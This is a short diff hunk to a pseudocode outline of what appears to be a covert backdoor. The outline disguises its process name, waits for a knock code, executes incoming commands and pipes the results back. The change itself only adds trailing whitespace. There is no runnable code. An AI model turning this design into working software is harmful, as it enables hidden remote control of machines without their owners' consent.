@@ -4,7 +4,7 @@ main
 		disguise name
 
 	begin listening
-		wait for knockcode
+		wait for knockcode 
 			while getting commands
 				execute command
 				spawn result thread, pipe in results
